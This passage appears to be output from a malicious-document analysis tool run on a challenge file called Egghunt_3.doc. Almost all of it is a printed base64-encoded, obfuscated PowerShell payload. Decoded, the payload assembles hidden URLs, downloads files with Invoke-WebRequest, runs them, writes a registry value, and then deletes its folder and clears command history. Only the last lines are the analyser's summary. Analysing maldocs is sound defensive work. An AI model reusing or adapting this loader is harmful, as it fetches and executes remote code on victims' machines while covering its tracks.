rACcAOABoAHEAKQAoACcAKwAnADYAQQAzAGMAJwApACsAJwAnACsAJwBsAHMAJwArACcAZQBjAHQAJwArACgAJwBBADgAJwArACcAaABxACkAKAA2ACcAKwAnAEEAMwBjACcAKQArACcAZgAuACcAKwAnAG4AbwAnACsAKAAnAEEAOAAnACsAJwBoAHEAKQAoACcAKwAnADYAQQAzAGMAJwApACsAJwBxAF8AeAA9AHEAJwArACcAYgBpACcAKwAoACcAQQAnACsAJwA4AGgAcQApACgAJwArACcANgBBACcAKwAnADMAYwAnACkAKwAnAGwAJwArACcAZABlAHIAJwArACgAJwBBADgAaABxACkAKAA2AEEAJwArACcAMwBjACcAKQArACcAcQBfAHgAPQBxADQAJwArACcAXwA3AGYAJwArACgAJwBBADgAaABxACkAKAA2ACcAKwAnAEEAMwBjACcAKQArACcAMgA2ACcAKwAnADEANAAnACsAJwBmAGYANQAnACsAKAAnAEEAJwArACcAOABoAHEAKQAoADYAQQAnACsAJwAzAGMAJwApACsAJwAnACsAJwBkAGIAJwArACcAMQAwADQAJwArACgAJwAnACsAJwBBADgAJwArACcAaABxACkAKAA2AEEAMwBjACcAKQArACcAZQBlACcAKwAoACcAQQAnACsAJwA4AGgAcQApACgAJwArACcANgBBADMAYwAnACkAKwAnACcAKwAnADAAOQBmADYAZABmACcAKwAoACcAJwArACcAQQA4AGgAcQApACgANgBBADMAYwAnACkAKwAnADcAOABiAGIAZgAnACsAKAAnACcAKwAnAEEAOABoAHEAKQAoADYAQQAnACsAJwAzAGMAJwApACsAJwAzADgANAAnACsAKAAnAEEAJwArACcAOABoAHEAKQAoADYAQQAnACsAJwAzAGMAJwApACsAJwBiADUAJwArACgAJwAnACsAJwBBADgAaABxACkAKAA2ACcAKwAnAEEAMwBjACcAKQArACcALgBqACcAKwAnAHAAZwAnACsAJwBAAGgAJwArACgAJwBBADgAJwArACcAaABxACkAKAA2ACcAKwAnAEEAMwBjACcAKQArACcAdAB0AHAAJwArACcAcwA6ACcAKwAoACcAQQA4AGgAcQApACgANgBBACcAKwAnADMAYwAnACkAKwAnAHEAXwB4AD0AcQAnACsAJwBxAF8AeAA9AHEAaABlAGwAcwAnACsAKAAnAEEAJwArACcAOABoAHEAKQAoADYAQQAnACsAJwAzAGMAJwApACsAJwBlAGMAJwArACgAJwBBACcAKwAnADgAaABxACkAKAA2AEEAJwArACcAMwBjACcAKQArACcAdABmACcAKwAnAC4AbgBvAHEAXwB4AD0AcQBiACcAKwAoACcAQQA4ACcAKwAnAGgAcQApACgAJwArACcANgBBADMAYwAnACkAKwAnAGkAbAAnACsAJwBkAGUAcgBxAF8AeAA9AHEAJwArACgAJwBBACcAKwAnADgAaABxACkAKAA2AEEAJwArACcAMwBjACcAKQArACcANQBfACcAKwAnADMAOABkADYANwAnACsAKAAnAEEAOABoAHEAKQAoADYAQQAnACsAJwAzAGMAJwApACsAJwBhACcAKwAnAGYAMwA4ADUAJwArACcANwAzACcAKwAoACcAJwArACcAQQA4ACcAKwAnAGgAcQApACgAJwArACcANgBBADMAYwAnACkAKwAnADIAZgA1ACcAKwAoACcAQQA4AGgAcQApACgANgAnACsAJwBBADMAYwAnACkAKwAnACcAKwAnAGQANgAzACcAKwAoACcAQQA4ACcAKwAnAGgAcQApACgAJwArACcANgBBADMAYwAnACkAKwAnADIAJwArACcAOAA0ACcAKwAnAGQAYgAzADkAJwArACgAJwAnACsAJwBBADgAaABxACkAKAA2AEEAJwArACcAMwBjACcAKQArACcAYwA1ADEAJwArACcAOQA1AGIAYQAnACsAKAAnACcAKwAnAEEAOABoAHEAKQAoADYAQQAnACsAJwAzAGMAJwApACsAJwAuACcAKwAnAGoAcABnACcAKQAuACIAUgBgAEUAUABgAEwAQQBgAGMAZQAiACgAJwBBADgAaABxACkAKAA2AEEAMwBjACcALAAkAFIAZQBJAFUAQgBLAE4AKQAtAHIAZQBQAGwAYQBDAEUAKAAnAHEAXwB4AD0AcQAnACwAWwBzAFQAcgBpAG4AZwBdAFsAQwBIAGEAUgBdADQANwApACkAOwAkAGQAaABlAG8ARQBPADEAeQAgAD0AIAAoACgAJABIAE8ATQBFACAAKwAoACIAUQBJAG0AawBrAEcAZQBnAFgAVgBYAEEASQBsAHEAQwBVAEoAbwBTAFAAcQBDAGkASQBsAHEAQwBxAGwATgA4AEwAQwB1ADgASQBsAHEAQwA4AFEAagBQAFcAbwAwADYASQBsAHEAQwAiAFsALQAxAC4ALgAtADUAMgBdACAALQBqAG8AaQBuACAAJwAnACkAIAApAC4AcgBlAHAAbABhAGMAZQAoACAAIgBDAHEAbABJACIALABbAHMAdAByAGkAbgBnAF0AWwBjAGgAYQByAF0AOQAyACkAKQA7ACQASgBlAE8AUwBYADcAdwBmAEwAYwAgAD0AIAAoAFsAcwB0AHIAaQBuAGcAXQAoACIAewAxADMAfQB7ADYAfQB7ADIAOAB9AHsAMAB9AHsAMQAyAH0AewAyADQAfQB7ADIANgB9AHsAMQA1AH0AewAyADMAfQB7ADUAfQB7ADEAMAB9AHsAMgB9AHsAMQA3AH0AewAzAH0AewAyADQAfQB7ADEAMQB9AHsAMQB9AHsAMgA4AH0AewAxADcAfQB7ADEAOQB9AHsAMgA2AH0AewAxADUAfQB7ADgAfQB7ADUAfQB7ADIANAB9AHsAMQAwAH0AewAxADQAfQB7ADIANQB9AHsAMQA4AH0AewAxADkAfQB7ADIANwB9AHsANAB9AHsAMgA0AH0AewAxADEAfQB7ADIAfQB7ADIAMgB9AHsAMgAwAH0AewAxADkAfQB7ADcAfQB7ADIAMQB9AHsAMwB9AHsAOQB9AHsAMgA0AH0AewAxADcAfQB7ADEANgB9AHsAMgA1AH0AIgAgAC0AZgAnAHUAJwAsACcAaQAnACwAJwBBACcALAAnAGUAJwAsACcAcwAnACwAJwB0ACcALAAnAEsAJwAsACcAQwAnACwAJwBGACcALAAnAFkAJwAsACcAdwAnACwAJwBNACcALAAnADoAJwAsACcAaAAnACwAJwBJACcALAAnAG8AJwAsACcAVQAnACwAJwBSACcALAAnAGQAJwAsACcATwAnACwAJwBEACcALAAnAGsAJwAsACcAbAAnACwAJwBmACcALAAnAFwAJwAsACcATgAnACwAJwBTACcALAAnAFcAJwAsACcAYwAnACkAKQA7ACQASwBGAEgATwBYACAAPQAgACgAWwBzAHQAcgBpAG4AZwBdACgAIgB7ADYAfQB7ADIAMAB9AHsAMgA3AH0AewAwAH0AewAxADAAfQB7ADIAMwB9AHsAMgA0AH0AewAxADYAfQB7ADIAMgB9AHsAMQA5AH0AewA5AH0AewAxADcAfQB7ADEANQB9AHsAMQAxAH0AewAyADMAfQB7ADEAMwB9AHsAMQB9AHsANQB9AHsAMQA1AH0AewAxADQAfQB7ADIANAB9AHsAMQA2AH0AewA3AH0AewAzAH0AewAyADMAfQB7ADkAfQB7ADEAMgB9AHsAMgA1AH0AewAxADgAfQB7ADEANAB9AHsAMgA2AH0AewAyAH0AewAyADMAfQB7ADEAMwB9AHsAMQA3AH0AewAyADEAfQB7ADEAOAB9AHsAMQA2AH0AewA1AH0AewA0AH0AewAxADEAfQB7ADgAfQAiACAALQBmACcAdQAnACwAJwBpACcALAAnAHMAJwAsACcAdAAnACwAJwBLACcALAAnAEMAJwAsACcASAAnACwAJwBGACcALAAnAFkAJwAsACcAdwAnACwAJwA6ACcALAAnAEUAJwAsACcASQAnACwAJwBtACcALAAnAG8AJwAsACcAUgAnACwAJwBPACcALAAnAGEAJwAsACcARAAnACwAJwBUACcALAAnAGsAJwAsACcAbAAnACwAJwBmACcALAAnAFwAJwAsACcAUwAnACwAJwBuACcALAAnAFcAJwAsACcAYwAnACkAKQA7ACQAbAB1ADgAOQBOAEMANwBIAHEAIAA9ACAAIgBtAGEAbABkAG8AYwBrAGsAZQB5ACIAOwAkAE8AQgA5ADcAYQBaACAAPQAgACQAZABoAGUAbwBFAE8AMQB5ACsAIgA2AC4AagBwAGcAIgA7ACQAZwBOAE4AaQBwAFcAIAA9ACAAJABjADQAdAA2AGIAWgBuAHUAIAArACAAJABnAE4ATgBpAHAAVwA7ACQASgBNAHEAdwBsAGwASgBkADcAawA9ADEAOwAkAEEAeQBEAGkAcQBoAFgAUwB4AD0AIgAiADsAZgBvAHIAIAAoACQAUgBNAGgAdgBSAGIAaABuAD0AMAA7ACQAUgBNAGgAdgBSAGIAaABuACAALQBsAHQAIAAkAEcAQwBtAHoAdABOAFcAegAuAGwAZQBuAGcAdABoADsAJABSAE0AaAB2AFIAYgBoAG4APQAkAFIATQBoAHYAUgBiAGgAbgArADMAKQAgAHsAJABBAHkARABpAHEAaABYAFMAeAA9ACQAQQB5AEQAaQBxAGgAWABTAHgAKwAgACgAWwBzAHQAcgBpAG4AZwBdAFsAYwBoAGEAcgBdACgAKABbAGkAbgB0AF0AKAAkAEcAQwBtAHoAdABOAFcAegBbACQAUgBNAGgAdgBSAGIAaABuAC4ALgAoACQAUgBNAGgAdgBSAGIAaABuACsAMgApAF0AIAAtAGoAbwBpAG4AIAAnACcAKQApAC0AJABKAE0AcQB3AGwAbABKAGQANwBrACkAKQA7ACQASgBNAHEAdwBsAGwASgBkADcAawA9ACQASgBNAHEAdwBsAGwASgBkADcAawArADEAfQA7AE4AZQB3AC0ASQB0AGUAbQAgAC0AcABhAHQAaAAgACQASgBlAE8AUwBYADcAdwBmAEwAYwAgAC0AbgBhAG0AZQAgACQAbAB1ADgAOQBOAEMANwBIAHEAIAAtAHYAYQBsAHUAZQAgACQAQQB5AEQAaQBxAGgAWABTAHgAIAAtAGYAbwByAGMAZQAgAHwAIABvAHUAdAAtAG4AdQBsAGwAOwAkAEgAYwBvAFUAUQBQADoAOgAiAGMAcgBlAGEAdABlAGQAaQByAGUAYwB0AG8AcgB5ACIAKAAgACQAZABoAGUAbwBFAE8AMQB5ACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkADMAQgA5AFYAbQBaAEoAIABpAG4AIAAkAGMAUgBiAGMAbwA2AHEAMQBSAFYALgByAGUAcABsAGEAYwBlACgAJwBnAHIAYQBtAG0AYQByAGwAeQAnACwAJwAuAGUAeABlACcAKQAuAHMAcABsAGkAdAAoAFsAYwBoAGEAcgBdADYANAApAC4AcwBwAGwAaQB0ACgAWwBjAGgAYQByAF0AMQAyADQAKQAuAHIAZQBwAGwAYQBjAGUAKAAkADkALAAkADEAMAApACkAewBpAGYAKAAkADAAQgA3AHUAQwAxAGYAUwAzADoAOgBFAHgAaQBzAHQAcwAoACQATwBCADkANwBhAFoAKQApAHsAYgByAGUAYQBrAH0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAMwBCADkAVgBtAFoASgAgAC0ATwB1AHQARgBpAGwAZQAgACQATwBCADkANwBhAFoAfQBzAHQAYQByAHQAIAAkAE8AQgA5ADcAYQBaADsAJABjADQAdAA2AGIAWgBuAHUAPQAkAGcATgBOAGkAcABXACsAJABPAEIAOQA3AGEAWgArACQATwBCADkANwBhAFoAOwAkAGcATgBOAGkAcABXAD0AJABjADQAdAA2AGIAWgBuAHUAOwBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAHMAIAAxADsAUgBlAG0AbwB2AGUALQBpAHQAZQBtACAALQByAGUAYwB1AHIAcwBlACAALQBwAGEAdABoACAAIAAoACQASABvAG0AZQArACIAXAAiACsAJABkAGgAZQBvAEUATwAxAHkALgByAGUAcABsAGEAYwBlACgAJABIAG8AbQBlACsAIgBcACIALAAkAFkAUwBNAEwAUwApAC4AcwBwAGwAaQB0ACgAWwBzAHQAcgBpAG4AZwBdAFsAYwBoAGEAcgBdADkAMgApAFsAMABdACkAOwBjAGwAZQBhAHIALQBoAGkAcwB0AG8AcgB5ADsAfQBlAGwAcwBlAHsAYwBsAGUAYQByAC0AaABpAHMAdABvAHIAeQA7AGUAeABpAHQAfQB9ACQAbwBLAE8AYwBiAEcAMQBEAEMAPQAkAEcAOQA2AGgASgBwACsAJABxAHIAVgB0AHEAMgBwAHgAQwA=
++---------------------------------------------------------+
+
+VBA Builtins Called: ['Atn', 'CLng', 'Create', 'CustomDocumentProperties', 'GetObject', 'Hex', 'Log', 'Rnd']
+
+Finished analyzing /root/Egghunt_3.doc .
+
+[*] Done - Killing docker container 79d892a2b1830625fa3fe578856848a9d0cdd6d3e2bb8bc379fc90b7ea8838ca
